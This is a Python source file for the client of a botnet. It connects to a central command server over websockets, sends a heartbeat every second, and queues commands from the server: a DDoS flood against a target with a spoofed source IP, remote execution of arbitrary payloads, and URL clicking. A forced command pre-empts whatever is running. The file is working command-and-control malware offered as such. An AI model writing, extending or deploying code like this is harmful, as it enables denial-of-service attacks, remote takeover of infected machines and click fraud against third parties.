import socketio
import uuid

from commands.click import CommandClick
from commands.rce import CommandRCE
from commands.ddos import CommandDDoS
from commands.command import Command, CommandType
from queue import Queue
from utils import Interval
from os import getenv

socket_client = socketio.Client()
running_command: Command = None
botnet_id = str(uuid.uuid4())
command_queue = Queue()


def start_client() -> None:
    """
    Open Websocket connection to the central server
    """
    socket_client.connect("ws://{}:{}".format(getenv("CENTRAL_SERVER_IP"), getenv("CENTRAL_SERVER_PORT")))

# SocketIO event definitions


def send_heartbeat():
    """
    Send heartbeat to server
    """
    socket_client.emit('heartbeat', {
                       "uuid": botnet_id, "running": True if running_command is not None else False})
    print("Sending heartbeat")


def stop_heartbeat():
    """
    Stop heartbeat sending
    """
    global heartbeat
    heartbeat.stop()
    heartbeat = Interval(1000, send_heartbeat)


heartbeat = Interval(1000, send_heartbeat)


@socket_client.event
def connect():
    global heartbeat
    print('Connected to SocketIO server')
    heartbeat.start()


@socket_client.event
def connect_error(data):
    print("Failed to connect to SocketIO server")
    print(data)


@socket_client.event
def disconnect():
    global heartbeat
    print("Disconnected from SocketIO server")
    stop_heartbeat()


@socket_client.on('command')
def on_command(data):
    """
    Handle command order
    """
    global running_command
    global command_queue

    command: Command = None
    if data['type'] == CommandType.DDoS:
        command = CommandDDoS(
            data['target_ip'], data['target_port'], data['fake_ip'], data['nb_threads'])
    elif data['type'] == CommandType.RCE:
        command = CommandRCE(data['payload'])
    elif data['type'] == CommandType.CLICK:
        command = CommandClick(data['url'])

    if command is not None:
        if data['force'] == True:
            # Stop the current running command
            stop_command()
            # Clear the command queue
            clear_command_queue()
            # Add the command
            command_queue.put(command)
            # Run the command
            run_next_command()
            if running_command is not None and running_command.is_atomic:
                # Reset attack status after execution
                running_command = None
        else:
            # Add command to waiting queue
            command_queue.put(command)
            # Run the command if the botnet is free
            if running_command is None:
                run_next_command()
    else:
        print('Error, command {} does not exists'.format(data['type']))


def clear_command_queue():
    """
    Empty the command queue
    """
    global command_queue
    while not command_queue.empty():
        command_queue.get()


def run_next_command():
    """
    Pick the oldest command in the queue and run it
    Set back running_command to None if it raises error
    """
    global command_queue
    global running_command

    command = command_queue.get()
    if command is not None:
        running_command = command
        try:
            running_command.process()
        except:
            running_command = None


def stop_command():
    """
    Stop the current running command
    """
    global running_command
    if running_command is not None:
        running_command.stop()
        running_command = None


@socket_client.on('stop')
def on_stop():
    stop_command()
